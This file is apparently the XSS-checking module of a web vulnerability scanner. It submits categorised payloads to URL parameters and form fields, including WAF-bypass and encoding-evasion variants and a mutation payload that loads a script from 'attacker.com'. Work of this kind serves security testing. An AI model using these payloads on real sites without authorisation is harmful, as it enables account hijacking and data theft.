import logging
import re
from urllib.parse import parse_qs, urlparse
from bs4 import BeautifulSoup
import urllib.parse
import time
from . import get_session

# Advanced XSS payloads categorized by attack type
XSS_PAYLOADS = {
    "basic": [
        # Basic probing payloads
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
    ],
    
    "tag_based": [
        # XSS using HTML tags
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    
    "event_handlers": [
        # XSS using event handlers
        "onmouseover=alert(1)//",
        "onmouseout=alert(1)//",
        "onload=alert(1)//",
        "onerror=alert(1)//",
        "onfocus=alert(1) autofocus//",
        "onclick=alert(1)//",
        "onkeypress=alert(1)//",
    ],
    
    "attribute_breaking": [
        # XSS breaking out of attributes
        "\" onmouseover=\"alert(1)\"",
        "' onclick='alert(1)'",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        "' autofocus onfocus='alert(1)",
    ],
    
    "encoding_evasion": [
        # XSS using encoding to bypass filters
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # HTML entity encoding
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", # ASCII encoding
        "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>", # Unicode escapes
        "<script>eval(atob('YWxlcnQoMSk='))</script>", # Base64 encoding
        "<svg onload=\"eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')\">", # Hex escapes
    ],
    
    "dom_xss": [
        # DOM-based XSS payloads
        "#<img src=x onerror=alert(1)>",
        "?name=<script>alert(1)</script>",
        "javascript:alert(document.cookie)",
        "?<script>alert(1)</script>",
        "?q=<img/src/onerror=alert(1)>",
    ],
    
    "template_injection": [
        # Template injection vectors that can lead to XSS
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "<%= alert(1) %>",
        "#{alert(1)}",
    ],
    
    "waf_bypass": [
        # WAF/Filter bypass techniques
        "<img src=x onerror=a=alert,a(1)>", # Function name obfuscation
        "<svg/onload=setTimeout`alert\u0028document.domain\u0029`>", # Backticks & Unicode
        "'-alert(1)-'", # String manipulation
        "<x onclick=alert&lpar;1&rpar;>click me</x>", # HTML entities in attributes
        "<script>/* */alert(1)/* */</script>", # Comment injection
        "<a href=\"java&#9;script:alert(1)\">click me</a>", # Protocol obfuscation with tab
    ],
    
    "mutation_xss": [
        # XSS payloads that mutate in the DOM
        "<noscript><p title=\"</noscript><script>alert(1)</script>\">",
        "<img src=\"x\" onerror=\"s=document.createElement('script');s.src='https://attacker.com/evil.js';document.body.appendChild(s)\">"
    ],
    
    "polyglots": [
        # XSS polyglots that work in multiple contexts
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
    ]
}

# Indicators for successful XSS detection
XSS_DETECTION_STRINGS = [
    "alert(1)", "alert(document.domain)", "alert(document.cookie)",
    "XSS", "onerror=", "javascript:", "<svg", "<img", "<script",
    "fromCharCode", "setTimeout", "eval(", "Function(", "onload=",
    "onclick=", "<iframe", "document.createElement"
]

# Reflections that might indicate vulnerability but don't exec
REFLECTION_MARKERS = [
    "&lt;script&gt;", # HTML encoded
    "\\u003cscript\\u003e", # Unicode
    "&amp;lt;script&amp;gt;", # Double encoded
    "<!--<script>-->", # Comment enclosed
    "{\"<script>", # JSON context
    "<x-<script>" # Element splitting
]

# Injection points to test if forms are found
FORM_INJECTION_POINTS = ['input', 'textarea', 'search', 'query', 'comment', 'text']

def check(session, url, soup, response, config):
    """
    Advanced XSS scanner with optimized testing approach and multiple detection methods.
    
    Args:
        session: Session object for making requests
        url: Target URL
        soup: BeautifulSoup object of the response
        response: HTTP response object
        config: Scanner configuration
    
    Returns:
        List of findings
    """
    req_session = get_session(session)
    findings = []
    
    # Get baseline response metrics
    baseline_content = response.text
    baseline_length = len(baseline_content)
    
    # Extract parameters from the URL for testing
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    
    # Extract forms from the page
    forms = soup.find_all('form') if soup else []
    
    # Track vulnerable items to avoid redundant tests
    vulnerable_params = set()
    vulnerable_forms = set()
    tested_patterns = set()
    
    # --- 1. Test URL parameters for reflected XSS ---
    for param_name, param_values in params.items():
        # Start with basic payloads for faster detection
        for payload in XSS_PAYLOADS["basic"]:
            evidence_key = f"param:{param_name}:{payload[:20]}"
            if evidence_key in tested_patterns:
                continue
                
            tested_patterns.add(evidence_key)
            param_value = param_values[0] if param_values else ""
            
            # Create test URL with the injected payload
            new_params = params.copy()
            new_params[param_name] = [payload]
            query_string = urllib.parse.urlencode(new_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            
            try:
                start_time = time.time()
                r = req_session.get(test_url, timeout=5)
                response_time = time.time() - start_time
                
                # Check if the payload is reflected in the response
                if payload in r.text or any(detection_string in r.text for detection_string in XSS_DETECTION_STRINGS):
                    # If payload is reflected, verify it's not just echoed but actually executed
                    # For example, check if <script> tags are not escaped
                    is_vulnerable = False
                    
                    # 1. Check if HTML tags are preserved (not HTML escaped)
                    if "<script>" in payload and "&lt;script&gt;" not in r.text and "<script>" in r.text:
                        is_vulnerable = True
                    
                    # 2. Check if script/event attributes are preserved
                    elif "onerror=" in payload and "onerror=" in r.text:
                        is_vulnerable = True
                    
                    # 3. Check if javascript: protocol is preserved
                    elif "javascript:" in payload and "javascript:" in r.text:
                        is_vulnerable = True
                    
                    # 4. For more complex verification, we could use a browser automation tool
                    # but for this simple scanner we'll rely on pattern matching
                    
                    if is_vulnerable:
                        findings.append(f"Reflected XSS via URL parameter '{param_name}' using payload: {payload}")
                        vulnerable_params.add(param_name)
                        break  # Found vulnerability, move to next parameter
            except Exception:
                continue
    
    # --- 2. Test forms for stored/reflected XSS ---
    for form_index, form in enumerate(forms):
        # Skip forms we've already found to be vulnerable
        if form_index in vulnerable_forms:
            continue
            
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        form_action_url = urllib.parse.urljoin(url, form_action) if form_action else url
        
        # Extract form inputs
        inputs = {}
        for input_tag in form.find_all(['input', 'textarea']):
            name = input_tag.get('name')
            if name:
                inputs[name] = input_tag.get('value', '')
                
        if not inputs:
            continue  # Skip forms with no inputs
            
        # Test each input in the form
        for input_name, input_value in inputs.items():
            # Test with a subset of payloads based on input type
            # Use different payload categories based on the input context
            payload_categories = ["basic", "tag_based"]
            
            # Add specific payload categories for certain input types
            input_type = next((t.get('type', '') for t in form.find_all('input', {'name': input_name})), '')
            if input_type.lower() in ['text', 'search', 'url', 'email']:
                payload_categories.extend(["attribute_breaking", "waf_bypass"])
            
            for category in payload_categories:
                # Limit to first 2 payloads per category for efficiency
                for payload in XSS_PAYLOADS[category][:2]:
                    evidence_key = f"form:{form_index}:{input_name}:{payload[:20]}"
                    if evidence_key in tested_patterns:
                        continue
                        
                    tested_patterns.add(evidence_key)
                    
                    # Prepare form data with payload
                    form_data = inputs.copy()
                    form_data[input_name] = payload
                    
                    try:
                        # Submit the form
                        if form_method == 'post':
                            r = req_session.post(form_action_url, data=form_data, timeout=5)
                        else:
                            r = req_session.get(form_action_url, params=form_data, timeout=5)
                            
                        # Check for reflected payloads in the response
                        if payload in r.text or any(detection_string in r.text for detection_string in XSS_DETECTION_STRINGS):
                            # Verify it's a real vulnerability as we did for URL parameters
                            is_vulnerable = False
                            
                            if "<script>" in payload and "&lt;script&gt;" not in r.text and "<script>" in r.text:
                                is_vulnerable = True
                            elif "onerror=" in payload and "onerror=" in r.text:
                                is_vulnerable = True
                            elif "javascript:" in payload and "javascript:" in r.text:
                                is_vulnerable = True
                                
                            if is_vulnerable:
                                form_info = f"action='{form_action}', method='{form_method}'"
                                findings.append(f"XSS via form input '{input_name}' ({form_info}) using payload: {payload}")
                                vulnerable_forms.add(form_index)
                                break  # Found vulnerability, move to next form input
                    except Exception:
                        continue
    
    # --- 3. Test for DOM-based XSS ---
    if soup:
        # Look for common JavaScript sinks that might be vulnerable to DOM XSS
        dom_xss_sinks = [
            'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
            'insertAdjacentHTML', 'eval(', 'setTimeout(', 'setInterval(',
            'location.hash', 'location.href', 'location.search'
        ]
        
        # Extract all scripts from the page
        scripts = soup.find_all('script')
        scripts_text = ' '.join([script.string for script in scripts if script.string])
        
        # Check if any sinks are found in JavaScript code
        found_sinks = [sink for sink in dom_xss_sinks if sink in scripts_text]
        
        if found_sinks:
            # Test DOM XSS using fragment identifiers
            for payload in XSS_PAYLOADS["dom_xss"]:
                test_url = f"{url}#{payload}"
                try:
                    # We'd need a headless browser like Selenium to properly test DOM XSS
                    # For now just note suspicious sink points
                    findings.append(f"Potential DOM XSS sink found: {', '.join(found_sinks)}")
                    findings.append(f"  Use a browser to test: {test_url}")
                    break  # Just report once
                except Exception:
                    continue
    
    # --- 4. Test for stored XSS in already present content ---
    # This is a basic check for possible stored XSS payloads already on the page
    suspicious_patterns = [
        '<script>.*?</script>', '<img[^>]+onerror=', 'javascript:.*?\\(', 
        'on\\w+=["\'].*?\\(', '<svg[^>]+onload='
    ]
    
    for pattern in suspicious_patterns:
        matches = re.findall(pattern, response.text, re.IGNORECASE)
        if matches:
            findings.append(f"Potential stored XSS detected: {matches[0][:50]}...")
            break  # Report only once for this check
    
    # --- 5. Check for CSP bypasses if CSP is present ---
    csp_header = response.headers.get('Content-Security-Policy')
    if csp_header:
        # List of potentially unsafe CSP directives
        unsafe_csp = [
            "unsafe-inline", "unsafe-eval", "data:", "blob:",
            "*.", "https:", "http:", "nonce-"
        ]
        
        for unsafe in unsafe_csp:
            if unsafe in csp_header:
                findings.append(f"Potential CSP bypass opportunity: '{unsafe}' is allowed")
                # Test a specific payload for this bypass
                if unsafe == "unsafe-inline" and not vulnerable_params and params:
                    # Try a parameter that might not have been tested yet
                    param_name = next(iter(params.keys()))
                    test_url = f"{url}&{param_name}=<script>alert('CSP_BYPASS')</script>"
                    try:
                        r = req_session.get(test_url, timeout=5)
                        if "<script>alert('CSP_BYPASS')</script>" in r.text:
                            findings.append(f"CSP 'unsafe-inline' confirmed exploitable via parameter '{param_name}'")
                    except Exception:
                        pass
                break  # Only report once
    
    return findings

